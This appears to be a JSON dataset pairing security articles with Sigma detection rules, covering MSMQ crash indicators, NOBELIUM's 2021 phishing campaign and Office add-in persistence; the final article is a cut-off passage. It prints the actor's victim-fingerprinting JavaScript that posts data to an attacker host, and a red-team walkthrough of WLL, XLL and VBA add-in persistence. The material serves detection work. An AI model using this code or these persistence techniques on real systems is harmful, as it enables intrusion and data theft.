service\nDescription: The image displays the 'Message Queuing Properties' dialog for a local computer, specifically focusing on the Recovery tab. It outlines the service's response settings for various failure scenarios, including the actions to take on the first and second failures, the reset fail count period, and options to run a program in case of stops with errors. This image provides technical insights relevant to the configuration and behavior of the Message Queuing service in response to failures.\nTranscription: |\n  Message Queuing Properties (Local Computer)\n  \n  General | Log On | Recovery | Dependencies\n  \n  Select the computer's response if this service fails. Help me set up recovery actions.\n  \n  First failure:          Restart the Service\n  Second failure:        Take No Action\n  Subsequent failures:   Take No Action\n  \n  Reset fail count after:  0 days\n  Reset service after:     2 minutes\n  \n  [ ] Enable actions for stops with errors. [Restart Computer Options...]\n  \n  Run program\n  Program:                [Browse...]\n  Command line parameters: \n  [ ] Append fail count to end of command line (/fail=%1)\n  \n  [ OK ] [ Cancel ] [ Apply ]\n```\n\nIn production environments where MSMQ is part of a larger application stack, this might not be the case. It is possible that MSMQ is depended upon by other services that can detect the down state and relaunch. Each of these scenarios can leave indicators of attack or possible compromise.\n\nWhen a malformed packet is sent to the MSMQ service, the process can crash and create a Windows Event 7034 from the Service Control Manager source with details that include: “The Message Queuing service terminated unexpectedly”.\n\n```image\nAlt: Windows Event 7034\nDescription: The image displays the Windows Event 7034 from the Service Control Manager. It indicates that the Message Queuing service terminated unexpectedly. The Event ID is 7034, with additional details including the log name (System), source (Service Control Manager), and a link for more information. This event log entry is relevant to understanding potential attack indicators and system failures related to the MSMQ service.\nTranscription: |\n  Event 7034, Service Control Manager\n  \n  General\n  The Message Queuing service terminated unexpectedly.\n  \n  Details\n  Log Name:      System\n  Source:        Service Control Manager\n  Event ID:      7034\n  Level:         Error\n  User:          N/A\n  OpCode:        Info\n  More Information: Event Log Online Help\n```\n\nAdditionally, when attempting to trigger the issue on patched systems, a Windows Event 2027 was observed in the Event Viewer from the MSMQ source with details that include: “A corrupted packet was encountered”.\n\n```image\nAlt: Windows Event 2027\nDescription: The image depicts the Windows Event Viewer entry for Event ID 2027 related to the Message Queuing (MSMQ) service. It shows the message \"A corrupted packet was encountered\" along with details such as Log Name, Source (MSMQ), Level (Error), and OpCode (Info). This entry is relevant for analyzing potential security incidents or system malfunctions related to MSMQ.\nTranscription: |\n  Event 2027, MSMQ\n  \n  General     Details\n  \n  A corrupted packet was encountered:\n  \n  Log Name:      Application\n  Source:        MSMQ\n  Event ID:      2027\n  Level:         Error\n  User:          N/A\n  OpCode:        Info\n  More Information: Event Log Online Help\n```\n\n## Timeline\n\n4/11/2023: Microsoft released update to patch CVE-2023-21554. \n4/11/2023: Check Point Research published a blog post about QueueJumper.\n\n## Sources\n\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554\n- https://exchange.xforce.ibmcloud.com/vulnerabilities/251594\n- https://research.checkpoint.com/2023/queuejumper-critical-unauthorized-rce-vulnerability-in-msmq-service/\n- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc725576(v=ws.10))\n- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/85498b96-f2c8-43b3-a108-c9d6269dc4af\n- https://gist.github.com/tothi/e9ad022453b713681faa684af9005bef\n- https://learn.microsoft.com/en-us/previous-versions/windows/desktop/msmq/ms704178(v=vs.85))",
    "sigma_rule": {
      "title": "Important Windows Service Terminated Unexpectedly",
      "id": "56abae0c-6212-4b97-adc0-0b559bb950c3",
      "status": "test",
      "description": "Detects important or interesting Windows services that got terminated unexpectedly.",
      "references": [
        "https://web.archive.org/web/20230925072707/https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-14",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7034
        },
        "selection_name": [
          {
            "param1|contains": "Message Queuing"
          },
          {
            "Binary|contains": [
              "4d0053004d005100",
              "6d0073006d007100"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Rare false positives could occur since service termination could happen due to multiple reasons"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_terminated_unexpectedly.yml",
    "id": "830"
  },
  {
    "url": "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/",
    "markdown": "",
    "sigma_rule": {
      "title": "New Custom Shim Database Created",
      "id": "ee63c85c-6d51-4d12-ad09-04e25877a947",
      "status": "test",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
        "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
        "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-29",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547.009"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            ":\\Windows\\apppatch\\Custom\\",
            ":\\Windows\\apppatch\\CustomSDB\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate custom SHIM installations will also trigger this rule"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_creation_new_shim_database.yml",
    "id": "841"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
    "markdown": "# New sophisticated email-based attack from NOBELIUM\n\n**Categories:**\n- News\n- Email security\n- Microsoft Defender\n\n**Published:** May 27, 2021\n\n---\n\n## Overview\n\nMicrosoft Threat Intelligence Center (MSTIC) has uncovered a wide-scale malicious email campaign operated by NOBELIUM, the threat actor behind the attacks against SolarWinds, the SUNBURST backdoor, TEARDROP malware, GoldMax malware, and other related components.\n\nThe campaign, initially observed and tracked by Microsoft since January 2021, evolved over a series of waves demonstrating significant experimentation. On May 25, 2021, the campaign escalated as NOBELIUM leveraged the legitimate mass-mailing service, Constant Contact, to masquerade as a US-based development organization and distribute malicious URLs to a wide variety of organizations and industry verticals.\n\nMicrosoft is issuing this alert and new security research regarding this sophisticated email-based campaign that NOBELIUM has been operating to help the industry understand and protect from this latest activity.\n\n> **Note:** This is an active incident. We will post more details here as they become available.\n>\n> **Update [05/28/2021]:** We published a new blog post detailing NOBELIUM’s latest early-stage toolset, composed of four tools utilized in a unique infection chain: EnvyScout, BoomBox, NativeZone, and VaporRage.\n\n## Attack Details\n\nNOBELIUM has historically targeted government organizations, non-government organizations (NGOs), think tanks, military, IT service providers, health technology and research, and telecommunications providers. With this latest attack, NOBELIUM attempted to target approximately 3,000 individual accounts across more than 150 organizations, employing an established pattern of using unique infrastructure and tooling for each target, increasing their ability to remain undetected for a longer period of time.\n\nThis new wide-scale email campaign leverages the legitimate service Constant Contact to send malicious links that were obscured behind the mailing service’s URL. Due to the high volume of emails distributed in this campaign, automated email threat detection systems blocked most of the malicious emails and marked them as spam. However, some automated threat detection systems may have successfully delivered some of the earlier emails to recipients either due to configuration and policy settings or prior to detections being in place.\n\nMicrosoft 365 Defender delivers coordinated defense against this threat. Microsoft Defender for Office 365 detects the malicious emails, and Microsoft Defender for Endpoint detects the malware and malicious behaviors.\n\n## Spear-phishing Campaign Delivers NOBELIUM Payloads\n\nThe NOBELIUM campaign observed by MSTIC and detailed in this blog differs significantly from the NOBELIUM operations that ran from September 2019 until January 2021, which included the compromise of the SolarWinds Orion platform.\n\n### Early Testing and Initial Discovery\n\nAs part of the initial discovery of the campaign in February, MSTIC identified a wave of phishing emails that leveraged the Google Firebase platform to stage an ISO file containing malicious content. MSTIC traced the start of this campaign to January 28, 2021, when the actor was seemingly performing early reconnaissance by only sending the tracking portion of the email.\n\n### Evolving Delivery Techniques\n\nIn the next evolution of the campaign, MSTIC observed NOBELIUM attempting to compromise systems through an HTML file attached to a spear-phishing email. When opened by the targeted user, a JavaScript within the HTML wrote an ISO file to disc and encouraged the target to open it, resulting in the ISO file being mounted much like an external or network drive. From here, a shortcut file (LNK) would execute an accompanying DLL, which would result in Cobalt Strike Beacon executing on the system.\n\n```image\nAlt: Example Flow of HMTL/ISO infection chain.\nDescription: The image illustrates the flow of an email-based attack from NOBELIUM. It starts with a spear-phishing email that contains an HTML attachment. This leads to HTML smuggling, where an ISO file (slip.iso) is created. The ISO contains a malicious shortcut file (slip.lnk) and a DLL file (msdiskmount.service.dll) that acts as a loader for Cobalt Strike Beacon. Additionally, there is a document (reply slip.rtf) that includes encrypted malware, showcasing the various components of the infection chain.\nTranscription: |\n  Spear-phishing email\n      └── attachment.html\n          └── HTML smuggling\n              └── slip.iso (ISO image)\n                  ├── slip.lnk (malicious LNK)\n                  ├── msdiskmount.service.dll (Cobalt Strike Beacon loader)\n                  └── reply.slip.rtf (document with encrypted malware)\n```\n\n*Figure 1. Example Flow of HMTL/ISO infection chain.*\n\nHere’s an example of target fingerprinting code leveraging Firebase:\n\n```\ntry {\n  let sdfgfghj = '';\n  let kjhyui = new XMLHttpRequest();\n  kjhyui.open('GET', 'https://api.ipify.org/?format=jsonp?callback=?', false);\n  kjhyui.onreadystatechange = function (){\n    sdfgfghj = this.responseText;\n  }\n  kjhyui.send(null);\n  let ioiolertsfsd = navigator.userAgent;\n  let uyio = window.location.pathname.replace('/','');\n  var ctryur = {'io':ioiolertsfsd,'tu':uyio,'sd':sdfgfghj};\n  ctryur = JSON.stringify(ctryur);\n  let sdfghfgh = new XMLHttpRequest();\n  sdfghfgh.open('POST', 'https://eventbrite-com-default-rtdb.firebaseio.com/root.json', false);\n  sdfghfgh.setRequestHeader('Content-Type', 'application/json');\n  sdfghfgh.send(ctryur);\n} catch (e) {}\n```\n\n### Escalated Targeting and Delivery\n\nIn May 2021, the actor changed techniques once more by maintaining the HTML and ISO combination, but dropped a custom .NET first-stage implant, detected as TrojanDownloader:MSIL/BoomBox, that reported host-based reconnaissance data to, and downloaded additional payloads from, the Dropbox cloud storage platform.\n\nOn May 25, the NOBELIUM campaign escalated significantly. Using the legitimate mass mailing service Constant Contact, NOBELIUM attempted to target around 3,000 individual accounts across more than 150 organizations.\n\n```image\nAlt: Example email screenshot.\nDescription: The image shows a screenshot of an email purportedly from USAID, titled \"USAID Special Alert!\" dated May 25, 2021. The email contains a message about new documents related to election fraud allegedly published by Donald Trump, with a prominent button labeled \"View documents\". It also includes links to visit the USAID website and social media icons. The email header indicates it was sent from the address 'ashainfo@usaid.gov', and the footer contains information about the USAID Office of American Schools and Hospitals Abroad.\nTranscription: |\n  USAID Special Alert!\n  From: USAID <ashainfo@usaid.gov>\n  To: [redacted]\n  Date: Tue 5/25/2021 10:11 AM\n  \n  U.S. Agency for International Development\n  May 25, 2021\n  \n  USAID Special Alert:\n  Donald Trump has published new documents on election fraud\n  \n  [View documents]\n  \n  [Visit our website]\n  \n  And visit us at\n  [Facebook icon] [Instagram icon]\n  \n  USAID Office of American Schools and Hospitals Abroad | 1300 Pennsylvania Avenue NW, Washington, DC 20004\n  \n  [Unsubscribe] [Update Profile] [Constant Contact Data Notice]\n  Sent by ashainfo@usaid.gov\n```\n\n*Figure 2. Example email screenshot.*\n\nIf the user clicked the link on the email, the URL directs them to the legitimate Constant Contact service, which follows this pattern:\n\n```\nhttps://r20.rs6[.]net/tn.jsp?f=\n```\n\nThe user is then redirected to NOBELIUM-controlled infrastructure, with a URL following this pattern:\n\n```\nhttps://usaid.theyardservice[.]com/d/<target_email_address>\n```\n\nA malicious ISO file is then delivered to the system. Within this ISO file are the following files that are saved in the `%USER%\\AppData\\Local\\Temp\\<random folder name>\\` path:\n\n- A shortcut, such as *Reports.lnk*, that executes a custom Cobalt Strike Beacon loader\n- A decoy document, such as *ica-declass.pdf*, that is displayed to the target\n- A DLL, such as *Document.dll*, that is a custom Cobalt Strike Beacon loader dubbed NativeZone by Microsoft\n\n```image\nAlt: ISO file contents with hidden \"Documents.dll\" inside.\nDescription: The image displays a file explorer window showing the contents of an ISO file labeled 'DECLASS' on a drive. The contents include three files: 'Documents.dll', which is an application extension, 'ICA-declass.pdf', a PDF document, and 'Reports' which is a shortcut file. The 'Documents.dll' file is notably an application extension, while the 'ICA-declass.pdf' file is much larger, indicating it may contain substantial content. The timestamp for all files shows they were modified on April 22, 2021.\nTranscription: |\n  DVD Drive (F:) DECLASS\n  \n  Name                       Date modified       Type                     Size\n  Documents.dll              4/22/2021 11:06 AM  Application extension    1,707 KB\n  ICA-declass.pdf            4/22/2021 11:09 AM  Microsoft Edge PDF       19,319 KB\n  Reports                    4/22/2021 11:06 AM  Shortcut                 2 KB\n```\n\n*Figure 3. ISO file contents. It is worth noting that the “Documents.dll” is a hidden file.*\n\n```image\nAlt: Shortcut which executes the hidden DLL file.\nDescription: The image displays the properties window of a shortcut file named 'Reports.' The key focus is on the 'Target' location, which shows a command designed to execute the hidden DLL file 'Documents.dll.' The path indicates that this shortcut is set to run 'explorer.exe' with the 'Documents.dll' file as an argument, suggesting it is part of a malicious payload deployment strategy. This aligns with the context of the NOBELIUM attack, where such shortcuts are utilized to execute hidden malware.\nTranscription: |\n  Reports Properties\n  \n  General    Shortcut    Details\n  \n  Target type:        Application\n  Target location:   \n  Target:\n      %/system32/explorer.exe Documents.dll,Open\n  Start in:         \n  Shortcut key:      None\n  Run:               Normal window\n  Comment:         \n  \n  Open File Location    Change Icon...    Advanced...\n```\n\n*Figure 4. Shortcut which executes the hidden DLL file.*\n\nThe successful deployment of these payloads enables NOBELIUM to achieve persistent access to compromised systems. Then, the successful execution of these malicious payloads could enable NOBELIUM to conduct action-on objectives, such as lateral movement, data exfiltration, and delivery of additional malware.\n\n## Indicators of Compromise (IOC)\n\nThis attack is still active, so these indicators should not be considered exhaustive for this observed activity. These indicators of compromise are from the large-scale campaign launched on May 25, 2021.\n\n| INDICATOR                                                        | TYPE       | DESCRIPTION                               |\n| ---------------------------------------------------------------- | ---------- | ----------------------------------------- |\n| ashainfo@usaid.gov                                               | Email      | Spoofed email account                     |\n| mhillary@usaid.gov                                               | Email      | Spoofed email account                     |\n| 2523f94bd4fba4af76f4411fe61084a7e7d80dec163c9ccba9226c80b8b31252 | SHA-256    | Malicious ISO file (container)            |\n| d035d394a82ae1e44b25e273f99eae8e2369da828d6b6fdb95076fd3eb5de142 | SHA-256    | Malicious ISO file (container)            |\n| 94786066a64c0eb260a28a2959fcd31d63d175ade8b05ae682d3f6f9b2a5a916 | SHA-256    | Malicious ISO file (container)            |\n| 48b5fb3fa3ea67c2bc0086c41ec755c39d748a7100d71b81f618e82bf1c479f0 | SHA-256    | Malicious shortcut (LNK)                  |\n| ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c | SHA-256    | Cobalt Strike Beacon malware              |\n| ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330 | SHA-256    | Cobalt Strike Beacon malware              |\n| usaid.theyardservice[.]com                                       | Domain     | Subdomain used to distribute ISO file     |\n| worldhomeoutlet[.]com                                            | Domain     | Subdomain in Cobalt Strike C2             |\n| dataplane.theyardservice[.]com                                   | Domain     | Subdomain in Cobalt Strike C2             |\n| cdn.theyardservice[.]com                                         | Domain     | Subdomain in Cobalt Strike C2             |\n| static.theyardservice[.]com                                      | Domain     | Subdomain in Cobalt Strike C2             |\n| 192[.]99[.]221[.]77                                              | IP address | IP resolved to by *worldhomeoutlet[.]com* |\n| 83[.]171[.]237[.]173                                             | IP address | IP resolved to by *theyardservice[.]com*  |\n| theyardservice[.]com                                             | Domain     | Actor controlled domain                   |\n\n## Mitigations\n\nApply these mitigations to reduce the impact of this threat:\n\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product.\n- Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts.\n- Enable network protection to prevent access to malicious domains.\n- Enable investigation and remediation in full automated mode.\n- Use device discovery to increase visibility into your network.\n- Enable multifactor authentication (MFA) to mitigate compromised credentials.\n\n## Detection Details\n\n### Antivirus\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n- Trojan:Win32/NativeZone.C!dha\n\n### Endpoint Detection and Response (EDR)\n\nAlerts with the following titles in the Security Center can indicate threat activity on your network:\n\n- Malicious ISO File used by NOBELIUM\n- Cobalt Strike Beacon used by NOBELIUM\n- Cobalt Strike network infrastructure used by NOBELIUM\n\n## Advanced Hunting\n\n### Microsoft 365 Defender\n\nTo locate possible exploitation activity, run the following query in the Microsoft 365 security center:\n\n#### NOBELIUM abuse of USAID Constant Contact resources in email data\n\n```\nEmailUrlInfo\n| where UrlDomain == \"r20.rs6.net\"\n| join kind=inner EmailEvents on $left.NetworkMessageId==$right.NetworkMessageId\n| where SenderMailFromDomain == \"in.constantcontact.com\"\n| where SenderFromDomain == \"usaid.gov\"\n```\n\n#### NOBELIUM subject lines used in abuse of Constant Contact service\n\n```\nlet SubjectTerms = pack_array (\"Special\",\"Alert\");\nEmailUrlInfo\n| where UrlDomain == \"r20.rs6.net\"\n| join kind=inner EmailEvents on $left.NetworkMessageId==$right.NetworkMessageId\n| where SenderMailFromDomain == \"in.constantcontact.com\"\n| where SenderFromDomain == \"usaid.gov\"\n| where Subject has_any (SubjectTerms)\n```\n\n### Azure Sentinel\n\nTo locate possible exploitation activity using Azure Sentinel, customers can find a Sentinel query containing these indicators in this GitHub repository.\n\n## MITRE ATT&CK Techniques Observed\n\nThis threat makes use of attacker techniques documented in the MITRE ATT&CK framework.\n\n### Initial Access\n\n- T1566.003 Phishing: Spearphishing via Service — NOBELIUM used the legitimate mass mailing service, Constant Contact to send their emails.\n- T1566.002 Phishing: Spearphishing Link — The emails sent by NOBELIUM includes a URL that directs a user to the legitimate Constant Contact service that redirects to NOBELIUM-controlled infrastructure.\n\n### Execution\n\n- T1610 Deploy Container — Payload is delivered via an ISO file which is mounted on target computers.\n- T1204.001 User Execution: Malicious Link — Cobalt Strike Beacon payload is executed via a malicious link (LNK) file.\n\n### Command and Control\n\n- T1071.001 Application Layer Protocol: Web Protocols — Cobalt Strike Beacons call out to attacker infrastructure via port 443.",
    "sigma_rule": {
      "title": "ISO or Image Mount Indicator in Recent Files",
      "id": "4358e5a5-7542-4dcb-b9f3-87667371839b",
      "status": "test",
      "description": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
        "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
        "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-11",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ".iso.lnk",
            ".img.lnk",
            ".vhd.lnk",
            ".vhdx.lnk"
          ],
          "TargetFilename|contains": "\\Microsoft\\Windows\\Recent\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Cases in which a user mounts an image file for legitimate reasons"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_iso_file_recent.yml",
    "id": "851"
  },
  {
    "url": "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
    "markdown": "# Add-In Opportunities for Office Persistence\n\n21 April, 2017\n\n## Introduction\n\nOne software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office. Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms.\n\nThis post will explore various opportunities for gaining persistence through native Microsoft Office functionality. It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“One Template to Rule ‘Em All”).\n\nThe following opportunities for Office-based persistence will be discussed, along with the relative benefits and disadvantages of each (from a red team perspective as we’re talking about obtaining persistence):\n\n1. WLL and XLL add-ins for Word.\n2. VBA add-ins for Excel and PowerPoint.\n3. COM add-ins for all Office products.\n4. Automation add-ins for Excel.\n5. VBA editor (VBE) add-ins for all VBA using Office products.\n6. VSTO add-ins for all Office products.\n\nThe described persistence techniques were tested with Office 2013 running on Windows 7, 8.1, and 10.\n\n## WLL and XLL “Add-Ins” for Word and Excel\n\nKey to the work by Kostas and others on persistence using Office templates was the concept of “Trusted Locations”. Files located here containing VBA code are not subject to the standard restrictions imposed by the macro settings, and the code will be executed without warning even if macros are disabled. Further research, however, found that certain trusted locations to which a typical standard user has write privileges could also be used to host DLL-based add-ins.\n\n### WLL “Add-Ins” for Word\n\nThe three default locations for Word are shown below. It can be seen that the purposes of the trusted locations are split between “templates” and “StartUp” functionality.\n\n```image\nAlt: WLL1\nDescription: The image shows a screenshot of the trusted locations settings in Microsoft Word 2013. It highlights three specific paths designated as trusted sources for opening files, with a focus on the 'StartUp' directory. This directory is indicated as a default location for Word 2013 and is crucial for the operation of WLL add-ins, which can lead to arbitrary code execution when Word starts.\nTranscription: |\n  Trusted Locations\n  \n  Warning: All these locations are treated as trusted sources for opening files. If you change or add a location, make sure that the new location is secure.\n  \n  User Locations\n  \n  Path                                                                      Description\n  C:\\...AppData\\Roaming\\Microsoft\\Templates\\                                Word 2013 default location: User Templates\n  C:\\...Files (x86)\\Microsoft Office\\Templates\\                             Word 2013 default location: Application Tem...\n  C:\\...ata\\Roaming\\Microsoft\\Word\\Startup\\                                 Word 2013 default location: StartUp\n  \n  Policy Locations\n```\n\nFurther investigation of this “StartUp” trusted location found that it could host “Word Add-Ins” of a “*.wll” extension. This is an archaic extension dating back to the days of Word 97 but appears to still be supported, and there’s little documentation on how to actually create such a file. After some research, it was identified that a “*.wll” file is essentially a DLL with additional “Office-specific extensions”. This means it supports basic DLL functionality, and therefore you can just rename a “*.dll” to a “*.wll”, put it in the “StartUp” trusted location which defaults to a location within the user’s home directory, and get arbitrary code execution when Word starts, all from a low privileged user.\n\nAn example of this can be seen below, where a WLL add-in launches \"calc.exe\", and can be seen running as a child of the Word process, \"WINWORD.EXE\".\n\n```image\nAlt: calc-process-tree\nDescription: The image is a screenshot of a task management interface displaying the process tree of two applications: 'WINWORD.EXE' (Microsoft Word) and 'calc.exe' (Windows Calculator). The image includes various metrics for these processes, such as CPU usage, private bytes allocated, and working set memory. Each process is accompanied by its respective process ID (PID), description, company name, and integrity level. This information illustrates the relationship between the two processes, highlighting the execution of 'calc.exe' as a child process of 'WINWORD.EXE', relevant to the discussion of WLL add-ins for persistence in Microsoft Word.\nTranscription: |\n  Process         | CPU  | Private Bytes | Working Set | PID  | Description        | Company Name         | Integrity\n  -----------------------------------------------------------------------------------------------------------\n  WINWORD.EXE     | 0.68 | 19,928 K      | 44,764 K    | 2100 | Microsoft Word     | Microsoft Corporation | Medium\n    calc.exe      | 0.07 | 7,156 K       | 13,640 K    | 4968 | Windows Calculator | Microsoft Corporation | Medium\n```\n\nFor anyone testing this with DLLs generated through Metasploit's \"msfvenom\" you’ll find that the payload gets executed when Word starts but Word then crashes. I found that constructing a bare bones C++ DLL that executed code directly within DllMain resolved the issue and allowed Word to continue execution.\n\nOne interesting behavior of Word for WLL add-ins is that despite being loaded automatically, and their containing code executed, Word lists them as an “inactive” add-in. Furthermore, and potentially because of this, disabling add-ins within Word’s Trust Center does not disable WLL add-ins.\n\n```image\nAlt: WLL3\nDescription: The image depicts a screenshot of the 'Add-Ins' section within Microsoft Word. It shows a list of inactive application add-ins, highlighting an entry named 'InconspicuousWLLAddIn.wll', indicating its file path and type as a Word Add-in. This visual is relevant to the context of Word add-ins and their potential security implications, as it illustrates how certain add-ins can be listed as inactive while still being present in the system.\nTranscription: |\n  Inactive Application Add-ins\n  \n  InconspicuousV4LAddIn.vll      C:\\...LAddIn.vll      Word Add-in\n```\n\n### XLL “Add-Ins” for Excel\n\nExcel has a similar means of extending its functionality using DLLs which are known as XLL add-ins, and have the “*.xll” extension. Unlike WLL add-ins which are automatically loaded when Word opens, Excel needs to be configured to use an XLL add-in through adding a property to an existing registry key. This key is located at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nAn “OPEN” property should be added which contains the value of “/R FileNameOfAddIn.xll”.\n\n```image\nAlt: XLL1\nDescription: The image shows a screenshot of a Windows Registry Editor window displaying a specific key related to Excel add-ins. The highlighted section shows the 'OPEN' property under the registry key path corresponding to Excel options, indicating that an XLL add-in is configured to load by specifying its filename. This visual directly relates to the context provided, illustrating how XLL add-ins are set up in Excel.\nTranscription: |\n  OPEN\n  REG_SZ\n  /R XLLAddIn.xll\n```\n\nA full path does not need to be specified, as Excel defaults to looking in “%appdata%\\Microsoft\\AddIns” for the add-in file. Interestingly, this location is not specified in the trusted locations as was the case with WLL add-ins. This is potentially because the trusted locations are primarily focused on providing security controls around VBA execution.\n\nThe way that Excel uses XLL add-ins also differs from the way Word uses WLL add-ins. For each configured XLL add-in, Excel will look for exported functions in the DLL and call them as appropriate. For example, Excel will look for and call a function with the name of “xlAutoOpen” when the process first loads. This function as the name suggests mimics the behavior of VBA’s “Auto_Open()”.\n\nUnlike WLL add-ins, XLL add-ins are listed as being “active” within Excel’s add-in manager, and can be prevented from loading by disabling add-ins within the Trust Center.\n\n#### Benefits\n\n1. No administrative rights needed to write to the user’s “StartUp” location, or configure registry keys.\n2. Automatically loaded for Word, and only minimal registry edits are required for Excel.\n3. WLL add-ins are not prevented from loading by enabling “Disable all Application Add-ins”. This does not apply to XLL add-ins.\n4. WLL add-ins are listed as being \"Inactive\" in Word's GUI for monitoring add-ins, despite actually being \"Active\". This does not apply to XLL add-ins.\n5. They can potentially be used for persistence in Virtual Desktop Infrastructure (VDI) environments.\n\n#### Disadvantages\n\n1. Dropping a DLL into \"%appdata%\".\n2. Registry edits are required for XLL add-ins.\n\n## VBA “Add-Ins” for Excel and PowerPoint\n\nSimilar to Word, both Excel and PowerPoint have an equivalent “StartUp” trusted location. In fact, they each have two – one that’s user-specific and one that’s system-wide. The user-specific trusted locations (as that’s where a low privilege user will have write permissions) are referred to as “XLSTART” and “AddIn” for Excel and PowerPoint respectively.\n\nThese trusted locations are not intended to store DLL-based add-ins, but instead ones that are VBA-based with a non-standard extension intended specifically for add-ins.\n\nThis particular persistence vector most closely aligns with Kostas’ work on template persistence. The key distinction between the two approaches is that when VBA is included within a template, it is only executed in documents that derive from that template. VBA add-ins will execute for their specific event handlers whenever any document is opened within Excel and PowerPoint regardless of their originating template, but this functionality is limited to these two Office applications.\n\nThe approach to implementing each persistence vector is described below.\n\n### Excel\n\nCreate a new Excel spreadsheet, open the VBA editor, and insert a \"Module\" which contains the persistence mechanism.\n\n```image\nAlt: VBA-EX-1\nDescription: The image depicts a screenshot of the Microsoft Visual Basic for Applications (VBA) editor. It shows a project named 'VBAProject' with various components such as 'Microsoft Excel Objects' and 'Modules'. The code pane displays a subroutine named 'Auto_Open', which creates an object of 'WScript.Shell' and executes a file named 'calc.exe'. This example illustrates a method for using VBA in Excel for executing code upon opening a spreadsheet, relevant to the concept of persistence mechanisms in cyber threats.\nTranscription: |\n  vba\n  Sub Auto_Open()\n      Set objShell = CreateObject(\"WScript.Shell\")\n      objShell.Exec (\"calc.exe\")\n  End Sub\n```\n\nGo to save the spreadsheet, but instead of choosing a standard Excel format choose select “Excel Add-In” from the type menu which uses “*.xlam” or “*.xla” depending on the compatibility mode. This should be saved to the appropriate trusted location which is typically “%appdata%\\Microsoft\\Excel\\XLSTART”.\n\n```image\nAlt: VBA-EX-2\nDescription: The image depicts a 'Save As' dialog box from Microsoft Excel, showing the file path to the XLSTART folder. It highlights the selected file name 'InconspicuousAddIn.xlam' with the file type set to 'Excel Add-In (*.xlam)'. This image illustrates the process of saving an Excel file as an add-in, which is relevant to creating persistence mechanisms in VBA for Excel.\nTranscription: |\n  Save As\n  \n  Roaming > Microsoft > Excel > XLSTART\n  \n  File name: InconspicuousAddIn.xlam\n  Save as type: Excel Add-In (*.xlam)\n  \n  Save | Cancel\n```\n\nWhen Excel is next opened the add-in will be executed regardless of whether it’s a new spreadsheet or one that’s been previously saved.\n\n### PowerPoint\n\nPowerPoint VBA Add-Ins can be created in the same manner as with Excel, but in this case the file format is \"*.ppam\" or \"*.ppa\". The add-in should then be stored in the appropriate Trusted Location, which as mentioned previously this is referred to as “AddIns” in the case of PowerPoint. It is also typically located at the rather generic looking location of “%appdata%\\Microsoft\\AddIns”, which is also used for the XLL add-ins.\n\nUnlike with Excel, PowerPoint add-ins are not automatically loaded but can be configured to through modifying the registry. Thankfully such modification only needs to occur in the HKEY_CURRENT_USER (HKCU) hive. This involves creating a key at the following 